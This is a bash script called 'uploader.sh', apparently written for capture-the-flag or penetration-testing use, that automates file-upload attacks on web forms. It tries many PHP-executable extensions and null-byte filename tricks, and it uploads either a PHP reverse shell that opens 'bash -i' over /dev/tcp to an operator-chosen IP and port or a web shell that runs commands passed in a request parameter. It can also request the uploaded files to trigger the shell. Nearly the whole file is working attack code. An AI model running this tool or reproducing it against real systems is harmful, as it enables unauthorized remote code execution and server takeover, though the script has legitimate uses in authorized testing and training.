#!/bin/bash

line="\n============================================================\n"

Help()
{
	echo -e "$line\nUploader will run in interactive mode if you don't supply a value for required parameters\n"
	echo -e "Uploader supports the following arguments:\n$line-h: Display this help message\n\n"
	echo -e "-i <IP_Addres>: The IP Address to use for the Reverse Shell payload (i.e. your interface)\n\n"
	echo -e "-p <PORT>: The port that your listener is running on\n\n"
	echo -e "-u <URL>: The target URL that's used in POST Requests to upload a file\n\n"
	echo -e "-n <NAME>: The 'name' attribute that's used in POST Requests (e.g. file for name=\"file\")\n\n"
	echo -e "-e <URL>: Exploit mode. Attempts to automatically trigger a Reverse Shell. Enter the URL where uploaded files are saved to.\n\n"
	echo -e "-a <EXTENSION>: Allowed extension to use with Null Byte (defaults to jpg). Enter the extension without a period prepended.\n\n"
	echo -e "-b: Basic payload instead of a Reverse Shell. Provide commands as the value of the 0 parameter (e.g. /evil.php?0=id) . Incompatible with -e"
	echo -e "$line\n[Example Usage]\n"
	echo "./uploader.sh -i 12.345.67.89 -p 1337 -u http://10.10.40.117/panel/ -n fileUpload -e http://10.10.40.117/uploads/ -a png"
	echo -e "\n./uploader.sh -u http://10.10.40.117/panel/ -n fileUpload -b"

}

if [ $# -eq 0 ]
then
        echo -e "\nNo arguments provided. Defaulting to interactive mode.\n\n[!] Tip: Use the -h argument to view the help menu\n"

else
	while getopts ":hi:p:u:n:e:a:b" option; do
        	case $option in
			h)
                        	Help
                                exit
				;;
			i)
				ip=$OPTARG
				;;
			p)
				port=$OPTARG
				;;
			u)
				url=$OPTARG
				;;
			n)
				form_field=$OPTARG
				;;
			e)
				exploit=$OPTARG
				;;
			a)
				allowed=$OPTARG
				;;
			b)
#				payload='<?php if(isset($_REQUEST['"'"'0'"'"'])){echo "<pre>"; system($_REQUEST['"'"'0'"'"']); echo "</pre>"; die;} ?>'
				payload='<?php if(isset($_REQUEST["0"])){echo "<pre>"; system($_REQUEST["0"]); echo "</pre>"; die;} ?>'
				;;
			\?)
                                echo -e "\nError: Invalid argument"
                                exit 1
				;;
                esac
	done


fi

submit_field="submit"
submit_value="Upload"

if [[ -z "$url" ]]
then
	echo -e "\nEnter the target URL:\n"
	read url
fi

if [[ -z "$form_field" ]]
then
	echo -e "\nLook at a valid POST Request for reference. What is the value of the name attribute? (e.g. file for name=\"file\"):\n"
	read form_field
fi

if [[ -z "$allowed" ]]
then
	allowed="jpg"
fi

# PHP payload to send as the file content

if [[ -z "$payload" ]]
then

	if [[ -z "$ip" ]]
	then
		echo -e "\n[Listing Detected Interfaces]\n"
		ip -c a
		echo -e "\nEnter your IP Address:\n"
		read ip
	fi

	if [[ -z "$port" ]]
	then
		echo -e "\nEnter your listner's port:\n"
		read port
	fi

	payload='<?php exec("/bin/bash -c '"'"'bash -i >& /dev/tcp/'"$ip"'/'"$port"' 0>&1'"'"'");?>'
fi

# Extensions to try
extensions=(php php3 php4 php5 php7 pht phps phar phpt pgif phtml phtm inc)

# Function to upload a given filename
upload_file() {
	local filename="$1"
	local boundary="------------------------$(date +%s%N | sha256sum | cut -c1-29)"

	echo "[*] Uploading: $filename"

	curl -s -X POST "$url" \
		-H "Content-Type: multipart/form-data; boundary=$boundary" \
		--data-binary @<(cat <<EOF
--$boundary
Content-Disposition: form-data; name="$form_field"; filename="$filename"
Content-Type: application/php

$payload
--$boundary
Content-Disposition: form-data; name="$submit_field"

$submit_value
--$boundary--
EOF
)
}

# Upload with normal extensions
for ext in "${extensions[@]}"; do
	filename="testfile.$ext"
	upload_file "$filename"	
	echo -e "$line"

	ext_upper=$(echo -n "$ext" | tr '[:lower:]' '[:upper:]')
	filename="testfile.$ext_upper"
	upload_file "$filename"	
	echo -e "$line"
done

# Upload with null byte appended (percent-encoded %00)
for ext in "${extensions[@]}"; do
	filename="testfile.$ext%00.$allowed"
	upload_file "$filename"
	echo -e "$line"

	ext_upper=$(echo -n "$ext" | tr '[:lower:]' '[:upper:]')
	filename="testfile.$ext_upper%00.$allowed"
	upload_file "$filename"	
	echo -e "$line"
done

if [[ -n "$exploit" ]]
then
	for ext in "${extensions[@]}"; do
		exploit="${exploit%/}"
		
		filename="testfile.$ext"
		evil="$exploit"/"$filename"
		echo -e "$line\n[*] Visiting: $evil\n"
		curl $evil
		echo -e "$line"

		ext_upper=$(echo -n "$ext" | tr '[:lower:]' '[:upper:]')
		filename="testfile.$ext_upper"
		evil="$exploit"/"$filename"
		echo -e "$line\n[*] Visiting: $evil\n"
		curl $evil
		echo -e "$line"

		filename="testfile.$ext%00.$allowed"
		evil="$exploit"/"$filename"
		echo -e "$line\n[*] Visiting: $evil\n"
		curl $evil
		echo -e "$line"

		filename="testfile.$ext_upper%00.$allowed"
		evil="$exploit"/"$filename"
		echo -e "$line\n[*] Visiting: $evil\n"
		curl $evil
		echo -e "$line"



	done
else
	exit 0
fi
